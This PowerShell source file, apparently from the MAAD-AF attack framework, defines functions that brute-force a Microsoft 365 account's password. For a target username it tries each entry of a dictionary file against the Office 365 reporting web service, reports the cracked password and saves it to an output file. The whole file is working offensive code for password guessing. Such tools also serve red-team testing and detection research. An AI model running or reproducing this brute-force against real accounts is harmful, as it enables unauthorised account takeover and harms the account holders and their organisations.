###Primary Bruteforce function
function BruteForce ($username){
    #Check file input
    $check_file = $false
    while ($check_file -eq $false) {
        #Display available files in MAAD-AF directory
        $file_list = Get-ChildItem -Path ./* -Include *.txt
        if ($null -eq $file_list) {
            Write-Host "`nNote: No potential dictionary files found. Add a password dictionary text file to '$((Get-Item ./).FullName)'" -ForegroundColor Red
        }
        else {
            Write-Host "`nPossible dictionary files found in the MAAD-AF directory:" -ForegroundColor Gray
            foreach ($file in $file_list.Name){
                Write-Host "- $file" -ForegroundColor Gray
            }
        }

        $filename = Read-Host -Prompt "`nEnter the password dictionary file (include file extension)"
        $filename = $filename.Trim()
        $check_file = Test-Path -Path .\$filename
        
        if ($check_file -and $filename -ne "") {
            Write-Host "File found!!!"
            #Check file format - Only txt files accepted
            $extn = [IO.Path]::GetExtension($filename) 
            if ($extn -ne ".txt") {
                Write-Host "`nInvalid file type: Please provide a 'txt' dictionary file with each password on a new line." -ForegroundColor Red
                $check_file = $false
            }
            else {
                $check_file = $true
            } 
        }
        else {
            Write-Host "`nPassword file: '$filename' not found. Check -`n1.If the spelling is correct`n2.If the file exists in the same directory as the tool`n3.Include extension in filename" -ForegroundColor Red
            $check_file = $false
        }
    }
    
    #Read input password file
    $passwords = Get-Content -Path .\$filename

    Write-Host "`nStarting brute-force on user: $username using the password dictionary: $filename..."
    [int]$counter = 0
    Write-Progress -Activity "Running brute force" -Status "0% complete:" -PercentComplete 0;

    #Perform Brute-force.
    foreach ($password in $passwords) {
        #Convert password to secure string.
        $securestring = ConvertTo-SecureString $password -AsPlainText -Force

        #Create PSCredential object
        $credential = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $securestring)

        #Test authentication to Office 365 reporting API
        try {
            Invoke-WebRequest -Uri "https://reports.office365.com/ecp/reportingwebservice/reporting.svc" -Credential $credential -UseBasicParsing | Out-Null

            #Create custom object
            $userobject = New-Object -TypeName psobject
            $userobject | Add-Member -MemberType NoteProperty -Name "UserName" -Value $username
            $userobject | Add-Member -MemberType NoteProperty -Name "Password" -Value $password
            
            Write-Host "`nSuccess is No Accident ;) Successfully cracked account password!!!" -ForegroundColor Yellow -BackgroundColor Black
            $userobject | Format-Table 
            $userobject | Out-File -FilePath .\Outputs\External_BruteForce_Result.txt
            break

        } 
        catch {
            $counter++
            Write-Progress -Activity "Running brute-force attack" -Status "$([math]::Round($counter/$passwords.Count * 100))% complete:" -PercentComplete ([math]::Round($counter / $passwords.Count * 100));
        }
    }
    #Print if brute-force unsuccessful
    if ($userobject -eq $null){
        Write-Host "`nBrute-force Unsuccessful!!! Try another password dictionary or account!!!" -ForegroundColor Yellow -BackgroundColor Black
    }
    Pause
}

###Internal Bruteforce function
function InternalBruteForce {
    mitre_details("BruteForce")

    #Get account to target
    EnterAccount ("`nEnter an account to brute-force (eg:user@org.com) or enter 'recon' to find all available accounts")
    $username = $global:input_user_account

    BruteForce($username)
}

###External Bruteforce function
function ExternalBruteForce {
    mitre_details("BruteForce")

    #Get account to target
    do {
        $username = Read-Host -Prompt "`nEnter an account to brute-force (eg:user@org.com)"
    } until ("" -ne $username)

    BruteForce($username)
}